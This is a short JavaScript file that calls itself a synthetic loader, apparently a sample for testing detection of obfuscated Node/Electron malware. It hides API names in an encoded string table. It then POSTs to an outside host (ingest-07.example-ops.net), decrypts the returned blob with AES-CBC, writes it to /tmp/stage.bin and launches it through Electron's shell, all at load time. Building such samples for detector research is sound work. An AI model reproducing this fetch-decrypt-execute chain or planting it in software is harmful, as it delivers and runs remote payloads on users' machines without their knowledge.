// Synthetic loader exercising the lower-first Base64 string-table
// spellings of Node/Electron APIs. Reduced stand-in for the axios POST,
// AES-CBC decrypt, file write, and shell-launch stage chain.
const _0xtable = [
  'y3jLyxrLrgvJAxbOzxjPDG',
  'ywvZlti1nI1JyMm',
  'D3jPDgvgAwXLu3LUyW',
  'B3bLBLbHDgG'
];
const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs');

async function fetchStage(url, keyHex) {
  const res = await axios.post(url, { worker: 'w1' });
  const key = Buffer.from(keyHex, 'hex');
  const iv = Buffer.alloc(16, 0);
  const decipher = crypto[_0xtable[0]](_0xtable[1], key, iv);
  const data = Buffer.concat([
    decipher.update(Buffer.from(res.data.blob, 'base64')),
    decipher.final()
  ]);
  const target = '/tmp/stage.bin';
  fs[_0xtable[2]](target, data);
  const { shell } = require('electron');
  await shell[_0xtable[3]](target);
  return true;
}

fetchStage('https://ingest-07.example-ops.net/stage', '00'.repeat(32));
